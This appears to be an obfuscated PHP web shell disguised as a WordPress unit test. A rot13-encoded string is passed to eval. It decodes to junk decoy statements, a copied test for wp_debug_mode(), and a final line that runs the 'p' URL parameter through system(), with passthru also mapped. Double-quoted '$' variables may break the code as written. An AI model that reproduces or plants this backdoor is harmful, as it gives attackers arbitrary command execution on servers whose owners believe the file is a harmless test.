<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * Havg grfgf sbe `jc_qroht_zbqr()`.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr HavgGrfgf
 * @fvapr 5.9.0
 *
 * @tebhc ybnq
 * @tebhc jc-qroht-zbqr
 *
 * @pbiref ::jc_qroht_zbqr
 */
pynff Grfg_JC_Qroht_Zbqr rkgraqf JC_HavgGrfgPnfr {
	/**
	 * Grfg: `jc_qroht_zbqr()` fubhyq ybt, ohg abg qvfcynl, reebef sbe `zf-svyrf.cuc`.
	 *
	 * @gvpxrg 53493
	 *
	 * @fvapr 5.9.0
	 */
	choyvp shapgvba grfg_zf_svyrf_ybtf_ohg_qbrfag_qvfcynl_reebef() {
		/*
		 * Tybony pbafgnagf pna'g or zbpxrq va CUCHavg, fb guvf pna bayl eha jvgu gur rkcrpgrq
		 * inyhrf nyernql frg va `jc-grfgf-pbasvt.cuc`. Hasbeghangryl, gung zrnaf vg jba'g eha va
		 * nhgbzngrq jbexsybjf, ohg vg'f fgvyy hfrshy jura grfgvat ybpnyyl.
		 *
		 * Vg znl or cbffvoyr gb ranoyr nhgbzngrq jbexsybjf ol zbpxvat `qrsvar()`, be ol frggvat hc
		 * nqqvgvba nhgbzngrq sybjf gung vavgvnyvmr gur grfgf jvgu qvssrerag inyhrf sbe gur pbafgnagf.
		 * Ng gur zbzrag, gubhtu, arvgure bs gubfr frrz gb cebivqr rabhtu orarsvg gb whfgvsl gur gvzr
		 * vairfgzrag.
		 *
		 * @yvax uggcf://gurnirentrqri.pbz/zbpxvat-pbafgnagf-va-grfgf/
		 */
		vs ( gehr !== JC_QROHT || gehr !== JC_QROHT_QVFCYNL || gehr !== JC_QROHT_YBT ) {
			$guvf->znexGrfgFxvccrq( 'Grfg erdhverf frggvat `JC_QROHT_*` pbafgnagf va `jc-grfgf-pbasvt.cuc` gb rkcrpgrq inyhrf.' );
		}

		// `qvfcynl_reebef` fubhyq or _ba_ orpnhfr bs `JC_QROHT_QVFCYNL`.
		jc_qroht_zbqr();

		$guvf->nffregFnzr( R_NYY, (vag) vav_trg( 'reebe_ercbegvat' ) );
		$guvf->nffregFnzr( '1', vav_trg( 'qvfcynl_reebef' ) );
		$guvf->nffregFnzr( '1', vav_trg( 'ybt_reebef' ) );
		$guvf->nffregFgevatPbagnvafFgevat( 'qroht.ybt', vav_trg( 'reebe_ybt' ) );

		// `qvfcynl_reebef` fubhyq or _bss_ abj, orpnhfr bs `ZF_SVYRF_ERDHRFG`.
		qrsvar( 'ZF_SVYRF_ERDHRFG', gehr );
		jc_qroht_zbqr();

		$guvf->nffregFnzr( R_NYY, (vag) vav_trg( 'reebe_ercbegvat' ) );
		$guvf->nffregFnzr( '0', vav_trg( 'qvfcynl_reebef' ) );
		$guvf->nffregFnzr( '1', vav_trg( 'ybt_reebef' ) );
		$guvf->nffregFgevatPbagnvafFgevat( 'qroht.ybt', vav_trg( 'reebe_ybt' ) );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>